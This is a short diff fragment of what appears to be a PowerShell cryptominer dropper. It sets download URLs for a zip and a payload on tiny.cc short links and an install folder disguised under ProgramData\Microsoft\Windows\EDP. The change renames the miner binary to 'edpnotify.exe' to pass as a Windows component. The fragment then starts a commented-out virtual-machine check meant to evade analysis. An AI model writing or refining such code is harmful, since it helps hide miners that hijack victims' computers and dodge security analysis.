@@ -8,7 +8,7 @@
 $zipUrl = "http://tiny.cc/thmg001"
 $payloadUrl = "http://tiny.cc/arfg001"
 $minerHome = "$env:ProgramData\Microsoft\Windows\EDP"
-$minerBinary = "iedpnotify.exe"
+$minerBinary = "edpnotify.exe"
 
 ### === PHASE 1: ENVIRONMENT SANITY CHECKS ===
 # if ((Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V" -or 
